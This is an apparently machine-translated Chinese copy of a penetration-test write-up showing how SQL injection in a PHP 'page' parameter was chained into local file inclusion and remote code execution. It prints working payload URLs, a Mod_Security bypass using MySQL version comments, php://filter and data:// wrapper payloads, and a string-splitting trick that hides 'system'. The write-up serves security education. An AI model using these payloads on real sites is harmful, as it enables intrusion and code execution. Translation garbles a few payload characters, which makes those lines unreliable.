<html>
<head>
<title>SQL injection to RCE</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">SQL注入到RCE</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/sql-injection-to-lfi-to-rce-536bed29a862?source=collection_archive---------0-----------------------#2019-10-03">https://infosecwriteups.com/sql-injection-to-lfi-to-rce-536bed29a862?source=collection_archive---------0-----------------------#2019-10-03</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/96eddda159de10f3a6f0bb459d0eafa7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*l350Z9HoeUuobzTA_Il2Hw.jpeg"/></div></div></figure><p id="8cf6" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">在接下来的几行中，我将展示一个案例，几天前我在<strong class="ka ir"> </strong> <a class="ae kw" href="https://opendatasecurity.io" rel="noopener ugc nofollow" target="_blank"> <strong class="ka ir">开放数据安全</strong> </a>为我们的一个客户进行渗透测试时，我感兴趣的是我需要如何连接几个因素来获得RCE。</p><p id="2b74" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">由于显而易见的原因，一些客户数据将被匿名化。</p><p id="78cc" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">在对目录进行模糊处理时，我发现了一个文件夹，里面有一个php文件:</p><pre class="kx ky kz la gt lb lc ld le aw lf bi"><span id="627d" class="lg lh iq lc b gy li lj l lk ll">https://customer.com/php/load.php</span></pre><p id="042c" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">当我测试url时，我得到一个php警告:</p><figure class="kx ky kz la gt jr gh gi paragraph-image"><div class="gh gi lm"><img src="../Images/0fe68a7b601ccfe7ad707ac025024c4b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1056/format:webp/1*EEz7chxshZmBlooMKhGZbw.png"/></div></figure><p id="b089" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">正如我们所见，该应用程序正试图包括一个空文件名与. php扩展名。接下来我想到的是，也许我可以在GET参数中控制文件名，所以我决定强制使用一些参数。在使用任何脚本之前，我想我应该测试一下普通的老学校网站模块参数，比如"<em class="ln"> sec，section，mod，mod，file，page等等。令我惊讶的是，参数“<em class="ln">page”</em>抛出了一个不同的错误，一条MySQL警告消息:</em></p><figure class="kx ky kz la gt jr gh gi paragraph-image"><div class="gh gi lo"><img src="../Images/3bdcc590f3c615219f2879343e95d5c1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1158/format:webp/1*zKQJ7m1qPFTPVNM0wj1leA.png"/></div></figure><p id="d4bd" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我们可以看到，include函数继续在同一点使用空文件名，但我们可以看到我们得到了一个MySQL错误，然后从这里我尝试猜测应用程序从数据库中获得了所需的文件名，从这里我尝试了通常的SQL输入:</p><pre class="kx ky kz la gt lb lc ld le aw lf bi"><span id="13fb" class="lg lh iq lc b gy li lj l lk ll">https://customer.com/php/load.php?page=<strong class="lc ir">’ or ‘’=’</strong></span></pre><p id="91cb" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">并且我得到了包含警告消息，但是这次文件名不是空的，是<strong class="ka ir"><em class="ln">【analytics.php</em>】</strong>，第一个路径字符串有一个点，网站css样式没有加载(现在链接不是粉色的)</p><figure class="kx ky kz la gt jr gh gi paragraph-image"><div class="gh gi lp"><img src="../Images/67d92e92ed34c8970fdb8c9432a56c6a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1144/format:webp/1*QjQhA6ylCJpMqLnAf9p0YQ.png"/></div></figure><p id="e349" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">嗯，那时我确信include()从数据库中获取部分路径，我们需要尝试一个<strong class="ka ir">联合类型SQL注入</strong>，这样我们就可以控制路径并尝试本地文件包含。</p><p id="34b0" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">在我尝试的第一次注入中，我得到了406响应，网站启用了<strong class="ka ir"> Mod_Security apache模块</strong>，不幸的是它检测到了我的注入，但正如一些人所知，过时的<strong class="ka ir"> </strong> Mod_Security版本<strong class="ka ir">可以通过注入字符串中的MySQL注释绕过</strong>。我试了一下，用一个9列注入式查询成功了:</p><pre class="kx ky kz la gt lb lc ld le aw lf bi"><span id="371a" class="lg lh iq lc b gy li lj l lk ll">https://customer.com/php/load.php?page=’ <strong class="lc ir">/*!50000union*/</strong> select 1,2,3,4,5,6,7,8,9-- -</span></pre><figure class="kx ky kz la gt jr gh gi paragraph-image"><div class="gh gi lq"><img src="../Images/7b793110c1273d13e0178cd9a38fedbe.png" data-original-src="https://miro.medium.com/v2/resize:fit:1140/format:webp/1*l4JizDz-CWvCaIoQiozi3Q.png"/></div></figure><p id="46ae" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">在整个web应用程序中，我没有找到任何其他地方，上传表单允许上传图像或任何带有php代码的文件扩展名，我可以随意包含以利用当前的本地文件包含，但正如您在前面的图像中所看到的，我观察到我可以操纵路径的开头，这对我来说很好，因为我知道我可以尝试使用一些<strong class="ka ir"> php包装器</strong>。</p><p id="c9db" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">首先，我使用<strong class="ka ir">PHP://filter/convert . base64-encode/resource = "</strong>包装器来读取index.php文件:</p><pre class="kx ky kz la gt lb lc ld le aw lf bi"><span id="996c" class="lg lh iq lc b gy li lj l lk ll">https://customer.com/php/load.php?page=’ /*!50000union*/ select 1,2,3,4,5,’<strong class="lc ir">../index</strong>’,7,8,’<strong class="lc ir">php://filter/convert.base64-encode/resource=.</strong>’ -- -</span></pre><p id="6786" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">瞧，我们得到了一串base64编码的index.php源代码</p><figure class="kx ky kz la gt jr gh gi paragraph-image"><div class="gh gi lm"><img src="../Images/2e833e2139fe8d4c1dc772404da829bd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1056/format:webp/1*ARkvwCuVcZpLz3kKe_f7cA.png"/></div></figure><p id="f178" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">啊，此时我想要的是得到一个RCE，所以我首先尝试了input:// wrapper，但是没有成功，因为应用程序将输入与路径的其余部分连接起来，并且由于强大的Mod_Security模块，使用nullbyte %00是不可能的。然后我决定<strong class="ka ir">尝试用data:// wrapper </strong>发送一些php代码，希望能够执行:</p><pre class="kx ky kz la gt lb lc ld le aw lf bi"><span id="c99a" class="lg lh iq lc b gy li lj l lk ll">https://customer.com/php/load.php?page=' /*!50000union*/ select 1,2,3,4,5,6,7,8,’data://text/plain,<strong class="lc ir">&lt;?php echo system(“uname -a”);?&gt;</strong>’-- -</span></pre><p id="0e87" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我又一次收到了Mod_Security 406响应，阻止了我。想了一些，我认为问题出在“系统”字符串上，于是我回去编写了一些php代码行:</p><pre class="kx ky kz la gt lb lc ld le aw lf bi"><span id="2c31" class="lg lh iq lc b gy li lj l lk ll">&lt;?php<br/>$a=”sy”;<br/>$b=”stem”;<br/>$c=$a.$b;<br/>$c(“uname -a”);<br/>?&gt;</span></pre><p id="99b8" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">最后有效载荷是:</p><pre class="kx ky kz la gt lb lc ld le aw lf bi"><span id="8edd" class="lg lh iq lc b gy li lj l lk ll">https://customer.com/php/load.php?page=' /*!50000union*/ select 1,2,3,4,5,6,7,8,’data://text/plain,<strong class="lc ir">&lt;?php $a=”sy”;$b=”stem”;$c=$a.$b; $c(“uname -a”);?&gt;</strong>’ -- -</span></pre><p id="9250" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我们的命令结果是:</p><figure class="kx ky kz la gt jr gh gi paragraph-image"><div class="gh gi lr"><img src="../Images/ac0f97bc985163cc1305ad2a90e06eeb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1346/format:webp/1*CdiFlkRAOVxoHz2qzjavUA.png"/></div></figure><p id="31e8" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><strong class="ka ir">后来终于得到了RCE！！！^_^ </strong></p><figure class="kx ky kz la gt jr gh gi paragraph-image"><div class="ab gu cl ls"><img src="../Images/1c9b8fbde3af8b65b60957b4fdd7519c.png" data-original-src="https://miro.medium.com/v2/format:webp/0*X7ZwATIz7U3mUeyh.jpg"/></div></figure></div><div class="ab cl lt lu hu lv" role="separator"><span class="lw bw bk lx ly lz"/><span class="lw bw bk lx ly lz"/><span class="lw bw bk lx ly"/></div><div class="ij ik il im in"><p id="1777" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><em class="ln">关注</em> <a class="ae kw" href="https://medium.com/bugbountywriteup" rel="noopener"> <em class="ln"> Infosec报道</em> </a> <em class="ln">获取更多此类精彩报道。</em></p><div class="ma mb gp gr mc md"><a href="https://medium.com/bugbountywriteup" rel="noopener follow" target="_blank"><div class="me ab fo"><div class="mf ab mg cl cj mh"><h2 class="bd ir gy z fp mi fr fs mj fu fw ip bi translated">信息安全报道</h2><div class="mk l"><h3 class="bd b gy z fp mi fr fs mj fu fw dk translated">收集了世界上最好的黑客的文章，主题从bug奖金和CTF到vulnhub…</h3></div><div class="ml l"><p class="bd b dl z fp mi fr fs mj fu fw dk translated">medium.com</p></div></div><div class="mm l"><div class="mn l mo mp mq mm mr jw md"/></div></div></a></div></div></div>    
</body>
</html>